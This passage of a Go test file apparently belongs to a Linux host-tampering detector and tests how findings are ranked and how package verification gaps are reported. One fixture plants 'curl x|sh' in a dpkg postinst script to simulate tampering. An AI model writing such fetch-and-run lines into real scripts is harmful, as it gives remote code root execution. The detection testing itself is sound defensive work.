package judge

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/donaldsteele/telltale/internal/checklist"
	"github.com/donaldsteele/telltale/internal/collect"
	"github.com/donaldsteele/telltale/internal/escape"
	"github.com/donaldsteele/telltale/internal/model"
	"github.com/donaldsteele/telltale/internal/pkgverify"
)

var (
	now     = time.Date(2026, 11, 22, 14, 5, 0, 0, time.UTC)
	taken   = time.Date(2026, 11, 2, 9, 30, 0, 0, time.UTC)
	changed = time.Date(2026, 11, 21, 3, 12, 0, 0, time.UTC)
)

const (
	serverKey = `from="192.0.2.10" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIServerKeyBlob telltale-server`
	ownerKey  = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOwnerKeyBlob owner@laptop"
	evilKey   = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyBlobXX mallory"
)

var ctx = model.ScanContext{DigestKey: []byte("test-digest-key"), ServerAddr: "192.0.2.10", ServerKeyLine: serverKey}

func h(s string) string {
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:])
}

func file(p, content string, perm uint32) model.FileEntry {
	return model.FileEntry{Path: p, Type: "file", SHA256: h(content), Mode: 0o100000 | perm, Size: int64(len(content)), MTime: taken, CTime: taken}
}

func pkg(name, version string, files ...string) model.Package {
	return model.Package{Name: name, Version: version, Arch: "amd64", Status: "install ok installed", Files: files}
}

// clean is a machine on which every checklist item that can be judged
// passes and no heuristic fires.
func clean() *model.Collection {
	yes := true
	return &model.Collection{
		Schema: model.CollectionSchema,
		Host:   model.Host{Hostname: "web01", OSID: "debian", OSVersionID: "12", OSPretty: "Debian GNU/Linux 12 (bookworm)", Arch: "amd64", Kernel: "6.1.0-25-amd64"},
		Time:   now,
		AsRoot: true,
		Files: []model.FileEntry{
			file("/usr/bin/openssl", "openssl 3.0.14", 0o755),
			file("/usr/bin/ls", "ls 9.1", 0o755),
			file("/usr/share/doc/openssl/README", "readme", 0o644),
			file("/etc/hostname", "web01", 0o644),
		},
		Accounts: model.Accounts{
			Users: []model.User{{Name: "root", UID: 0, GID: 0, Home: "/root", Shell: "/bin/bash",
				Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "digest-root-1", LastChange: 20000}}},
			Groups: []model.Group{{Name: "root", GID: 0}, {Name: "sudo", GID: 27}, {Name: "staff", GID: 50}, {Name: "users", GID: 100}},
		},
		Packages: model.Packages{Installed: []model.Package{
			pkg("openssl", "3.0.14-1~deb12u2", "/usr/bin/openssl", "/usr/share/doc/openssl/README"),
			pkg("coreutils", "9.1-1", "/usr/bin/ls"),
			pkg("auditd", "1:3.0.9-1"),
			pkg("unattended-upgrades", "2.9.1+nmu3"),
			pkg("ufw", "0.36.2-1"),
		}},
		Firewall: model.Firewall{Backend: "nftables", InputPolicy: "drop", InputRules: 3, UFWEnabled: &yes},
		Sysctl:   map[string]string{"kernel.randomize_va_space": "2", "apparmor.enabled": "Y"},
	}
}

func clone(c *model.Collection) *model.Collection {
	b, err := json.Marshal(c)
	if err != nil {
		panic(err)
	}
	var out model.Collection
	if err := json.Unmarshal(b, &out); err != nil {
		panic(err)
	}
	return &out
}

func snapOf(c *model.Collection) *model.Snapshot {
	return &model.Snapshot{Schema: model.SnapshotSchema, Taken: taken, Collection: clone(c), Checks: checklist.Evaluate(c, ctx), DigestKey: ctx.DigestKey}
}

func archive(verified ...pkgverify.FileVerdict) *pkgverify.Result {
	return &pkgverify.Result{Mode: pkgverify.ModeArchive, Verified: verified, SourcesUsed: []string{"https://deb.debian.org/debian bookworm"}}
}

func run(c *model.Collection, s *model.Snapshot, r *pkgverify.Result) *model.Report {
	if s != nil && s.Collection != nil {
		inventoried(s.Collection)
	}
	return Judge(Input{Collection: inventoried(c), Snapshot: s, Context: ctx, Pkg: r, Now: now})
}

// inventoried adds to a fixture what the collector records on a real machine:
// an entry for every directory on the way to each file and persistence file,
// and an entry for each persistence file itself. Links are resolved against
// these (model.ResolveInInventory). The directories carry the snapshot's
// times, so they are never a change of their own.
func inventoried(c *model.Collection) *model.Collection {
	if c == nil {
		return c
	}
	have := map[string]bool{}
	for _, f := range c.Files {
		have[f.Path] = true
	}
	add := func(e model.FileEntry) {
		if !have[e.Path] {
			have[e.Path] = true
			e.Supplementary = true
			c.Files = append(c.Files, e)
		}
	}
	parents := func(p string) {
		for d := path.Dir(p); d != "/" && d != "."; d = path.Dir(d) {
			add(model.FileEntry{Path: d, Type: "dir", Mode: 0o40755, MTime: taken, CTime: taken})
		}
	}
	for _, f := range append([]model.FileEntry{}, c.Files...) {
		parents(f.Path)
	}
	for _, p := range c.Persist {
		parents(p.Path)
		// A link into a system directory leads to something that is there,
		// as on a real machine, unless the test names it "removed...".
		if t, ok := p.LinkTarget(); ok && !p.TargetRedacted() && !strings.HasPrefix(path.Base(t), "removed") {
			for _, d := range []string{"/usr/", "/lib/", "/etc/"} {
				if strings.HasPrefix(t, d) && !strings.Contains(p.Lines[0], "..") {
					parents(t)
					add(model.FileEntry{Path: t, Type: "file", Mode: 0o100644, MTime: taken, CTime: taken})
				}
			}
		}
		switch {
		case p.Mode&0o170000 == 0o120000 && len(p.Lines) > 0:
			add(model.FileEntry{Path: p.Path, Type: "symlink", Target: p.Lines[0], Mode: p.Mode, MTime: taken, CTime: taken})
		case p.Mode&0o170000 == 0o100000:
			add(model.FileEntry{Path: p.Path, Type: "file", Mode: p.Mode, MTime: taken, CTime: taken})
		}
	}
	return c
}

func find(r *model.Report, key string) *model.Finding {
	for i := range r.Findings {
		if r.Findings[i].Key == key {
			return &r.Findings[i]
		}
	}
	return nil
}

func explained(r *model.Report, key string) *model.Finding {
	for i := range r.Explained {
		if r.Explained[i].Key == key {
			return &r.Explained[i]
		}
	}
	return nil
}

func keys(r *model.Report) []string {
	var out []string
	for _, f := range r.Findings {
		out = append(out, f.Key)
	}
	return out
}

func must(t *testing.T, r *model.Report, key string, sev model.Severity) *model.Finding {
	t.Helper()
	f := find(r, key)
	if f == nil {
		t.Fatalf("no finding %q; have %v", key, keys(r))
	}
	if f.Severity != sev {
		t.Fatalf("%s: severity %v, want %v", key, f.Severity, sev)
	}
	return f
}

func absent(t *testing.T, r *model.Report, key string) {
	t.Helper()
	if f := find(r, key); f != nil {
		t.Fatalf("unexpected finding %q (%v): %s", key, f.Severity, f.Title)
	}
}

func hasEvidencePath(f *model.Finding, p string) bool {
	return slices.ContainsFunc(f.Evidence, func(e model.Evidence) bool { return e.Path == p })
}

func setFile(c *model.Collection, e model.FileEntry) {
	for i := range c.Files {
		if c.Files[i].Path == e.Path {
			c.Files[i] = e
			return
		}
	}
	c.Files = append(c.Files, e)
}

func setVersion(c *model.Collection, name, version string) {
	for i := range c.Packages.Installed {
		if c.Packages.Installed[i].Name == name {
			c.Packages.Installed[i].Version = version
			return
		}
	}
	panic("no package " + name)
}

func removePkg(c *model.Collection, name string) {
	c.Packages.Installed = slices.DeleteFunc(c.Packages.Installed, func(p model.Package) bool { return p.Name == name })
}

const evidenceCopy = "mkdir -p /root/telltale-evidence && cp -a --parents "

// --- the brief's tests ---

func TestJudgeRegressionIsTampering(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Sysctl["kernel.randomize_va_space"] = "0"

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "check:TT-KERN-001", model.SevTampering)
	if f.Source != "checklist" {
		t.Errorf("source %q", f.Source)
	}
	if e := f.Evidence[0]; e.Before != "kernel.randomize_va_space = 2" || e.After != "kernel.randomize_va_space = 0" {
		t.Errorf("evidence %+v", e)
	}
	if !strings.Contains(f.Fix, "sysctl -w kernel.randomize_va_space=2") {
		t.Errorf("fix %q", f.Fix)
	}
	if r.ExitCode != 2 {
		t.Errorf("exit %d", r.ExitCode)
	}

	// The same failure without a snapshot is only a weak setting.
	r = run(cur, nil, nil)
	must(t, r, "check:TT-KERN-001", model.SevWeak)
	if r.ExitCode != 1 {
		t.Errorf("exit %d", r.ExitCode)
	}
}

func TestJudgeUpgradeExplained(t *testing.T) {
	old := clean()
	cur := clone(old)
	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
	nf := file("/usr/bin/openssl", "openssl 3.0.15", 0o755)
	nf.CTime = changed
	setFile(cur, nf)
	v := pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: nf.SHA256, Actual: nf.SHA256, Source: "archive"}

	r := run(cur, snapOf(old), archive(v))
	if len(r.Findings) != 0 {
		t.Fatalf("findings %v", keys(r))
	}
	if r.ExitCode != 0 {
		t.Errorf("exit %d", r.ExitCode)
	}
	e := explained(r, "explained:openssl")
	if e == nil {
		t.Fatalf("no explained group; explained %+v", r.Explained)
	}
	if e.Severity != model.SevExplained || !hasEvidencePath(e, "/usr/bin/openssl") {
		t.Errorf("group %+v", e)
	}
	if e.Evidence[0].Before != "3.0.14-1~deb12u2" || e.Evidence[0].After != "3.0.15-1~deb12u1" {
		t.Errorf("version evidence %+v", e.Evidence[0])
	}
	if want := "openssl upgraded from 3.0.14-1~deb12u2 to 3.0.15-1~deb12u1; 1 file changed with it"; e.Title != want || e.Why == "" {
		t.Errorf("group title %q, want %q (why %q)", e.Title, want, e.Why)
	}

	// Without verification the same changed program is not explained, and
	// neither is the upgrade: nothing confirmed its files.
	r = run(cur, snapOf(old), nil)
	must(t, r, "snap.file_modified:/usr/bin/openssl", model.SevBackdoor)
	must(t, r, "snap.pkg_upgraded:openssl", model.SevNote)
	if explained(r, "explained:openssl") != nil {
		t.Errorf("unconfirmed upgrade explained")
	}
}

func TestJudgeKernelPackageExplained(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed,
		pkg("linux-image-6.1.0-25-amd64", "6.1.106-3"), pkg("linux-headers-6.1.0-25-amd64", "6.1.106-3"))

	cur := clone(old)
	cur.Packages.Installed = append(cur.Packages.Installed,
		pkg("linux-image-6.1.0-27-amd64", "6.1.115-1"), pkg("linux-headers-6.1.0-27-amd64", "6.1.115-1"))
	newKernel := cur
	r := run(cur, snapOf(old), nil)
	for _, n := range []string{"linux-image-6.1.0-27-amd64", "linux-headers-6.1.0-27-amd64"} {
		absent(t, r, "snap.pkg_installed:"+n)
		if explained(r, "explained:"+n) == nil {
			t.Errorf("%s not explained", n)
		}
	}

	// Another flavour, or an older version, is not routine.
	cur = clone(old)
	cur.Packages.Installed = append(cur.Packages.Installed,
		pkg("linux-image-6.1.0-27-rt-amd64", "6.1.115-1"), pkg("linux-image-6.1.0-20-amd64", "6.1.85-1"))
	r = run(cur, snapOf(old), nil)
	must(t, r, "snap.pkg_installed:linux-image-6.1.0-27-rt-amd64", model.SevNote)
	must(t, r, "snap.pkg_installed:linux-image-6.1.0-20-amd64", model.SevNote)

	// Removing the old kernel once a newer one is installed is routine too;
	// removing the only kernel of a flavour is not.
	cur2 := clone(newKernel)
	removePkg(cur2, "linux-image-6.1.0-25-amd64")
	r = run(cur2, snapOf(newKernel), nil)
	absent(t, r, "snap.pkg_removed:linux-image-6.1.0-25-amd64")
	if explained(r, "explained:linux-image-6.1.0-25-amd64") == nil {
		t.Errorf("old kernel removal not explained")
	}
	cur3 := clone(old)
	removePkg(cur3, "linux-image-6.1.0-25-amd64")
	must(t, run(cur3, snapOf(old), nil), "snap.pkg_removed:linux-image-6.1.0-25-amd64", model.SevNote)
}

func TestJudgeNewPackageWithSetuidIsBackdoor(t *testing.T) {
	old := clean()
	cur := clone(old)
	helper := file("/usr/bin/helper", "helper", 0o4755)
	jq := file("/usr/bin/jq", "jq", 0o755)
	cur.Files = append(cur.Files, helper, jq)
	cur.Packages.Installed = append(cur.Packages.Installed, pkg("helperpkg", "1.0-1", "/usr/bin/helper"), pkg("jq", "1.6-2.1", "/usr/bin/jq"))
	res := archive(
		pkgverify.FileVerdict{Path: "/usr/bin/helper", Package: "helperpkg", Version: "1.0-1", Expected: helper.SHA256, Actual: helper.SHA256, Source: "archive"},
		pkgverify.FileVerdict{Path: "/usr/bin/jq", Package: "jq", Version: "1.6-2.1", Expected: jq.SHA256, Actual: jq.SHA256, Source: "archive"})

	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.pkg_installed:helperpkg", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/bin/helper") {
		t.Errorf("evidence does not name the setuid program: %+v", f.Evidence)
	}
	if !strings.Contains(f.Fix, "apt-get purge -- 'helperpkg'") || !strings.HasPrefix(f.Fix, "mkdir -p /root/telltale-evidence && ") {
		t.Errorf("fix %q", f.Fix)
	}
	n := must(t, r, "snap.pkg_installed:jq", model.SevNote)
	// The packages' own verified files are evidence on the package's
	// finding, not ranked again.
	absent(t, r, "snap.file_added:/usr/bin/helper")
	absent(t, r, "snap.file_added:/usr/bin/jq")
	if !hasEvidencePath(n, "/usr/bin/jq") || explained(r, "explained:jq") != nil {
		t.Errorf("verified file of a new package not on its finding: %+v", n.Evidence)
	}
}

func TestJudgeDowngradeIsBackdoor(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3"))
	cur := clone(old)
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u1")

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.pkg_downgraded:openssh-server", model.SevBackdoor)
	if !strings.Contains(f.Fix, "apt-get install -- 'openssh-server=1:9.2p1-2+deb12u3'") {
		t.Errorf("fix %q", f.Fix)
	}
	if f.Evidence[0].Before != "1:9.2p1-2+deb12u3" || !strings.HasPrefix(f.Evidence[0].After, "1:9.2p1-2+deb12u1; files sha256:") {
		t.Errorf("evidence %+v", f.Evidence[0])
	}
}

func TestJudgeMismatchIsTampering(t *testing.T) {
	c := clean()
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{
		{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Expected: h("ls 9.1"), Actual: h("evil ls"), Reason: "differs from the file in the signed package", Source: "archive"},
		{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.14-1~deb12u2", Expected: h("openssl 3.0.14"), Actual: h("openssl 3.0.14"), Reason: "mode differs: deb 0755, disk 4755", Source: "snapshot", Kind: pkgverify.KindModeAddsPrivilege},
	}
	r := run(c, nil, res)
	f := must(t, r, "pkg.mismatch:/usr/bin/ls", model.SevTampering)
	if f.Source != "package" {
		t.Errorf("source %q", f.Source)
	}
	if e := f.Evidence[0]; e.Before != h("ls 9.1") || e.After != h("evil ls") || !strings.Contains(e.Detail, "archive") {
		t.Errorf("evidence %+v", e)
	}
	want := evidenceCopy + "'/usr/bin/ls' /root/telltale-evidence/ && apt-get install --reinstall -- 'coreutils'"
	if !strings.HasPrefix(f.Fix, want) {
		t.Errorf("fix %q, want prefix %q", f.Fix, want)
	}
	m := must(t, r, "pkg.mismatch:/usr/bin/openssl", model.SevTampering)
	if !strings.Contains(m.Title, "privileges its signed openssl package does not give it") {
		t.Errorf("mode mismatch title %q", m.Title)
	}
	if !strings.Contains(m.Evidence[0].Detail, "mode differs: deb 0755, disk 4755") {
		t.Errorf("mode evidence %+v", m.Evidence[0])
	}
	if r.ExitCode != 2 {
		t.Errorf("exit %d", r.ExitCode)
	}
}

func TestJudgeUnverifiableGrouped(t *testing.T) {
	c := clean()
	special := []model.FileEntry{
		file("/usr/bin/su", "su", 0o4755),
		file("/lib/modules/6.1.0-25-amd64/kernel/fs/x.ko", "ko", 0o644),
		file("/usr/lib/x86_64-linux-gnu/security/pam_x.so", "pam", 0o644),
		file("/boot/vmlinuz-6.1.0-25-amd64", "kernel", 0o644),
	}
	plain := []model.FileEntry{
		file("/usr/bin/a", "a", 0o755),
		file("/usr/bin/b", "b", 0o755),
		file("/usr/lib/x86_64-linux-gnu/libx.so.1", "lib", 0o644),
	}
	c.Files = append(append(c.Files, special...), plain...)
	notOfficial := pkgverify.ReasonNotOfficial + " or a snapshot of it"
	res := archive()
	for _, e := range special {
		res.Unverifiable = append(res.Unverifiable, pkgverify.FileVerdict{Path: e.Path, Package: "localpkg", Version: "1", Reason: notOfficial, Kind: pkgverify.KindNotFound})
	}
	res.Unverifiable = append(res.Unverifiable,
		pkgverify.FileVerdict{Path: "/usr/bin/a", Package: "localpkg", Reason: notOfficial},
		pkgverify.FileVerdict{Path: "/usr/bin/b", Package: "localpkg", Reason: notOfficial},
		pkgverify.FileVerdict{Path: "/usr/lib/x86_64-linux-gnu/libx.so.1", Package: "pro", Reason: pkgverify.ReasonPro})

	r := run(c, nil, res)
	g := must(t, r, "pkg.unverifiable", model.SevNote)
	if !strings.Contains(g.Title, "3") {
		t.Errorf("title %q does not count the 3 grouped files", g.Title)
	}
	var details []string
	for _, e := range g.Evidence {
		details = append(details, e.Detail)
	}
	all := strings.Join(details, "\n")
	if !strings.Contains(all, "2 files: "+notOfficial) || !strings.Contains(all, "1 file: "+pkgverify.ReasonPro) {
		t.Errorf("grouped evidence lacks reasons and counts:\n%s", all)
	}
	for _, e := range plain {
		absent(t, r, "pkg.unverifiable:"+e.Path)
	}
	for _, e := range special {
		must(t, r, "pkg.unverifiable:"+e.Path, model.SevBackdoor)
	}
}

func TestJudgeExceptionDropsMatchingValue(t *testing.T) {
	old := clean()
	old.Sysctl["kernel.randomize_va_space"] = "0"
	s := snapOf(old)
	s.Exceptions = []model.Exception{{FindingKey: "check:TT-KERN-001", AcceptedValue: "kernel.randomize_va_space = 0", Note: "lab box", At: taken}}

	r := run(clone(old), s, nil)
	absent(t, r, "check:TT-KERN-001")
	if len(r.Exceptions) != 1 || r.Exceptions[0].FindingKey != "check:TT-KERN-001" {
		t.Errorf("exceptions %+v", r.Exceptions)
	}
	if r.ExitCode != 0 {
		t.Errorf("exit %d (findings %v)", r.ExitCode, keys(r))
	}
}

func TestJudgeExceptionReappearsOnChange(t *testing.T) {
	old := clean()
	old.Sysctl["kernel.randomize_va_space"] = "1"
	s := snapOf(old)
	s.Exceptions = []model.Exception{{FindingKey: "check:TT-KERN-001", AcceptedValue: "kernel.randomize_va_space = 1", At: taken}}
	cur := clone(old)
	cur.Sysctl["kernel.randomize_va_space"] = "0"

	r := run(cur, s, nil)
	// The accepted value is the baseline: a different failing value is a
	// regression from it.
	f := must(t, r, "check:TT-KERN-001", model.SevTampering)
	if f.Evidence[0].Before != "kernel.randomize_va_space = 1" || f.Evidence[0].After != "kernel.randomize_va_space = 0" {
		t.Errorf("evidence %+v", f.Evidence[0])
	}
	if len(r.Exceptions) != 0 {
		t.Errorf("exception listed as applied: %+v", r.Exceptions)
	}

	// Any finding: the accepted value matches -> dropped; it changed -> back.
	mis := func(actual string) *pkgverify.Result {
		res := archive()
		res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Expected: h("ls 9.1"), Actual: actual, Reason: "differs from the file in the signed package", Source: "archive"}}
		return res
	}
	s2 := snapOf(clean())
	s2.Exceptions = []model.Exception{{FindingKey: "pkg.mismatch:/usr/bin/ls", AcceptedValue: h("local build"), At: taken}}
	r = run(clean(), s2, mis(h("local build")))
	absent(t, r, "pkg.mismatch:/usr/bin/ls")
	r = run(clean(), s2, mis(h("something else")))
	must(t, r, "pkg.mismatch:/usr/bin/ls", model.SevTampering)
}

func TestJudgeRankingOrder(t *testing.T) {
	older := time.Date(2026, 11, 1, 0, 0, 0, 0, time.UTC)
	newer := time.Date(2026, 11, 20, 0, 0, 0, 0, time.UTC)
	fs := []model.Finding{
		{Key: "z", Severity: model.SevNote, Source: "checklist"},
		{Key: "a", Severity: model.SevTampering, Source: "checklist"},
		{Key: "b", Severity: model.SevTampering, Source: "package"},
		{Key: "c", Severity: model.SevTampering, Source: "crossview"},
		{Key: "d", Severity: model.SevBackdoor, Source: "heuristic", Evidence: []model.Evidence{{When: &older}}},
		{Key: "e", Severity: model.SevBackdoor, Source: "heuristic", Evidence: []model.Evidence{{When: &older}, {When: &newer}}},
		{Key: "g", Severity: model.SevBackdoor, Source: "heuristic"},
		{Key: "f", Severity: model.SevBackdoor, Source: "heuristic"},
		{Key: "h", Severity: model.SevBackdoor, Source: "snapshot"},
		{Key: "i", Severity: model.SevWeak, Source: "heuristic"},
	}
	sortFindings(fs)
	var got []string
	for _, f := range fs {
		got = append(got, f.Key)
	}
	want := []string{"c", "b", "a", "h", "e", "d", "f", "g", "i", "z"}
	if !slices.Equal(got, want) {
		t.Errorf("order %v, want %v", got, want)
	}

	// End to end: a cross-view mismatch outranks a package mismatch, which
	// outranks regressed checklist items (the new system account also
	// breaks TT-ACCT-003); among notes the snapshot comes before heuristics.
	old := clean()
	cur := clone(old)
	cur.Sysctl["kernel.randomize_va_space"] = "0"
	cur.CrossView = []model.CrossViewResult{{Tool: "ps", Ran: true, HiddenFromTool: []string{"pid 4242 (evil)"}}}
	cur.Accounts.Users = append(cur.Accounts.Users, model.User{Name: "svc", UID: 998, GID: 998, Home: "/var/lib/svc", Shell: "/bin/sh",
		Password: model.PasswordState{Known: true, Locked: true, LastChange: 20000}})
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Expected: h("ls 9.1"), Actual: h("evil"), Reason: "differs from the file in the signed package", Source: "archive"}}
	r := run(cur, snapOf(old), res)
	order := keys(r)
	wantOrder := []string{"heur.crossview:ps", "pkg.mismatch:/usr/bin/ls", "check:TT-ACCT-003", "check:TT-KERN-001", "snap.user_added:svc", "heur.system_shell:svc"}
	if !slices.Equal(order, wantOrder) {
		t.Fatalf("order %v, want %v", order, wantOrder)
	}
	if r.Findings[0].Source != "crossview" {
		t.Errorf("cross-view source %q", r.Findings[0].Source)
	}
	for i := 1; i < len(r.Findings); i++ {
		if r.Findings[i].Severity > r.Findings[i-1].Severity {
			t.Errorf("not ranked by severity: %v", order)
		}
	}
}

func TestJudgeExitCodes(t *testing.T) {
	r := run(clean(), nil, archive())
	if r.ExitCode != 0 || len(r.Findings) != 0 {
		t.Fatalf("clean machine: exit %d, findings %v", r.ExitCode, keys(r))
	}

	weak := clean()
	weak.Sysctl["kernel.randomize_va_space"] = "1"
	if r := run(weak, nil, nil); r.ExitCode != 1 {
		t.Errorf("weak setting: exit %d (%v)", r.ExitCode, keys(r))
	}

	note := clean()
	note.Accounts.Users = append(note.Accounts.Users, model.User{Name: "svc", UID: 998, GID: 998, Home: "/var/lib/svc", Shell: "/bin/sh",
		Password: model.PasswordState{Known: true, Locked: true, Algo: "!", LastChange: 20000}})
	if r := run(note, nil, nil); r.ExitCode != 1 || find(r, "heur.system_shell:svc") == nil {
		t.Errorf("note: exit %d (%v)", r.ExitCode, keys(r))
	}

	bad := clean()
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Expected: "a", Actual: "b", Reason: "differs from the file in the signed package", Source: "archive"}}
	if r := run(bad, nil, res); r.ExitCode != 2 {
		t.Errorf("tampering: exit %d", r.ExitCode)
	}
	back := clean()
	back.Accounts.Users = append(back.Accounts.Users, model.User{Name: "toor", UID: 0, Home: "/root", Shell: "/bin/bash",
		Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "d", LastChange: 20000}})
	if r := run(back, nil, nil); r.ExitCode != 2 {
		t.Errorf("backdoor sign: exit %d", r.ExitCode)
	}
}

func TestJudgeAlwaysStatesKernelLimit(t *testing.T) {
	for name, r := range map[string]*model.Report{
		"nil collection": Judge(Input{Now: now}),
		"no snapshot":    run(clean(), nil, archive()),
		"snapshot":       run(clean(), snapOf(clean()), archive()),
	} {
		if !slices.Contains(r.CouldNotRuleOut, "kernel-level rootkits (any on-machine check can be fooled)") {
			t.Errorf("%s: could not rule out %q", name, r.CouldNotRuleOut)
		}
	}
}

func TestJudgeNoSnapshotComparedAgainstText(t *testing.T) {
	c := clean()
	judged := 0
	for _, res := range checklist.Evaluate(c, ctx) {
		if res.Skipped == "" {
			judged++
		}
	}
	items := "checklist (" + itoa(judged) + " items)"

	r := run(c, nil, archive())
	if want := []string{"Debian packages", items}; !slices.Equal(r.ComparedAgainst, want) {
		t.Errorf("compared against %q, want %q", r.ComparedAgainst, want)
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "no snapshot") }) {
		t.Errorf("no-snapshot limit not stated: %q", r.CouldNotRuleOut)
	}

	ub := clean()
	ub.Host.OSID = "ubuntu"
	if r := run(ub, nil, archive()); !slices.Contains(r.ComparedAgainst, "Ubuntu packages") {
		t.Errorf("ubuntu: %q", r.ComparedAgainst)
	}

	r = run(clean(), snapOf(clean()), archive())
	if len(r.ComparedAgainst) == 0 || r.ComparedAgainst[0] != "snapshot of 2026-11-02" {
		t.Errorf("with snapshot: %q", r.ComparedAgainst)
	}

	off := &pkgverify.Result{Mode: pkgverify.ModeOfflineLocal, Errors: []string{pkgverify.OfflineWarning},
		SourcesUsed: []string{"the machine's own package checksums (/var/lib/dpkg)"}}
	r = run(clean(), nil, off)
	if want := []string{"the machine's own package checksums (root can edit these)", items}; !slices.Equal(r.ComparedAgainst, want) {
		t.Errorf("offline: %q", r.ComparedAgainst)
	}
	for _, s := range r.Skipped {
		if s.Reason == pkgverify.OfflineWarning {
			t.Errorf("offline warning listed as a skipped check")
		}
	}

	refs := &pkgverify.Result{Mode: pkgverify.ModeRefs, SourcesUsed: []string{"reference bundle /mnt/refs"}}
	if r := run(clean(), nil, refs); !slices.Equal(r.ComparedAgainst, []string{"reference bundle", items}) {
		t.Errorf("refs: %q", r.ComparedAgainst)
	}

	// Verification ran but could reach no reference: nothing is claimed.
	unreachable := &pkgverify.Result{Mode: pkgverify.ModeArchive, Errors: []string{"fetch https://deb.debian.org/debian/dists/bookworm/InRelease: no route to host"},
		Unverifiable: []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Reason: "no route to host", Kind: pkgverify.KindUnreachable}}}
	r = run(clean(), nil, unreachable)
	if !slices.Equal(r.ComparedAgainst, []string{items}) {
		t.Errorf("unreachable archive: %q", r.ComparedAgainst)
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "no package reference could be used") }) {
		t.Errorf("unreachable archive gap not stated: %q", r.CouldNotRuleOut)
	}

	// No package verification: no package reference is claimed, and the
	// gap is stated.
	r = run(clean(), nil, nil)
	if !slices.Equal(r.ComparedAgainst, []string{items}) {
		t.Errorf("no verification: %q", r.ComparedAgainst)
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "package verification did not run") }) {
		t.Errorf("missing verification gap: %q", r.CouldNotRuleOut)
	}
}

// With a snapshot, package verification looks only at the package files that
// changed since it. When none did it has nothing to check and reads no
// source; that is not a gap and the report must not say it is.
func TestJudgeNoRefLimitOnlyWhenFilesWentUnchecked(t *testing.T) {
	noRef := func(r *model.Report) bool {
		return slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "no package reference could be used") })
	}
	nothing := func() *pkgverify.Result { return &pkgverify.Result{Mode: pkgverify.ModeRefs} }

	r := run(clean(), snapOf(clean()), nothing())
	if noRef(r) {
		t.Errorf("no package file changed, yet the report says no package reference could be used: %q", r.CouldNotRuleOut)
	}
	if PackagesIncomplete(r) {
		t.Errorf("no package file changed, yet package verification is reported incomplete: %q", r.CouldNotRuleOut)
	}

	// A changed package file that no reference could be used for is a gap.
	snap := snapOf(clean())
	cur := clean()
	cur.Files[1] = file("/usr/bin/ls", "ls 9.1 rebuilt", 0o755)
	if r := run(cur, snap, nothing()); !noRef(r) {
		t.Errorf("a changed package file went unchecked and the gap is not stated: %q", r.CouldNotRuleOut)
	}
	down := &pkgverify.Result{Mode: pkgverify.ModeArchive, Errors: []string{"fetch https://deb.debian.org/debian/dists/bookworm/InRelease: no route to host"},
		Unverifiable: []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Reason: "no route to host", Kind: pkgverify.KindUnreachable}}}
	if r := run(cur, snapOf(clean()), down); !noRef(r) {
		t.Errorf("the archive could not be reached for a changed package file and the gap is not stated: %q", r.CouldNotRuleOut)
	}
	// Without a snapshot every package file is in scope, so reading no
	// source at all is a gap.
	if r := run(clean(), nil, nothing()); !noRef(r) {
		t.Errorf("no snapshot and no source used, and the gap is not stated: %q", r.CouldNotRuleOut)
	}
	// Nothing changed, but verification ran into a problem and used no
	// source: what it had to check went unchecked.
	errsOnly := &pkgverify.Result{Mode: pkgverify.ModeArchive, Errors: []string{"open the package cache: permission denied"}}
	if r := run(clean(), snapOf(clean()), errsOnly); !noRef(r) {
		t.Errorf("verification failed with no source used, and the gap is not stated: %q", r.CouldNotRuleOut)
	}
	// Only a dpkg maintainer script changed (no package lists it, but it
	// runs as root): verification had it to check.
	before := clean()
	before.Files = append(before.Files, file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\nexit 0", 0o755))
	after := clone(before)
	setFile(after, file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\ncurl x|sh", 0o755))
	if r := run(after, snapOf(before), nothing()); !noRef(r) {
		t.Errorf("a changed maintainer script went unchecked and the gap is not stated: %q", r.CouldNotRuleOut)
	}
}

func itoa(n int) string {
	b, _ := json.Marshal(n)
	return string(b)
}

// --- package verification rulings ---

func TestJudgeSuspiciousIsBackdoor(t *testing.T) {
	res := archive()
	reason := "privilege granted by a local statoverride: deb 0755, disk 4755"
